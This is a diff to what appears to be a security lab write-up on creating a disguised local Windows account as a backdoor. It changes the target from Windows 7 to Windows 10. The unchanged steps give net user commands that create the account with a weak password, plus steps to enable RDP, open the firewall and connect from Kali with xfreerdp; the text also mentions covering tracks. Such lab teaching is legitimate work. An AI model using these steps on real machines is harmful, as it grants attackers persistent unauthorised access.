@@ -9,7 +9,7 @@ Creating a malicious local account is a simple way to install a backdoor, often 
 - Show how the malicious account can be used to cover tracks, such as deleting the dummy file
 
 ## Solutions With Scripts
-1. Open Command Prompt as Administrator in Windows 7 VM
+1. Open PowerShell as Administrator in Windows 10 VM
 2. Add a user with a non-suspicious name such as `svc_network` or `backup_admin`
    ```
    net user svc_network password123 /add
@@ -18,14 +18,14 @@ Creating a malicious local account is a simple way to install a backdoor, often 
    ```
    net localgroup Users svc_network add
    ```
-4. To enable RDP (Remote Desktop Protocol) on Windows 7 VM, go to Control Panel > System and Security > System. Click on Remote Settings from the left panel. Under the Remote Desktop section, select Allow connections from computers running any version of Remote Desktop
+4. To enable RDP (Remote Desktop Protocol) on Windows 10 VM, go to Control Panel > System and Security > System. Click on Remote Settings from the left panel. Under the Remote Desktop section, select Allow connections from computers running any version of Remote Desktop
 5. Allow RDP through Windows Firewall and ensure that Remote Desktop is checked for both private and public networks
 6. To initiate an RDP connection from Kali Linux, install `xfreerdp` using the following commands
    ```
    sudo apt update
    sudo apt install freerdp2-x11
    ```
-7. Use the malicious account credentials (`svc_network`) to connect to Windows 7 VM via RDP
+7. Use the malicious account credentials (`svc_network`) to connect to Windows 10 VM via RDP
    ```
    sudo xfreerdp /u:svc_network /p:password123 /v:192.168.1.21 /dynamic-resolution /cert:ignore /sec:tls
    ```
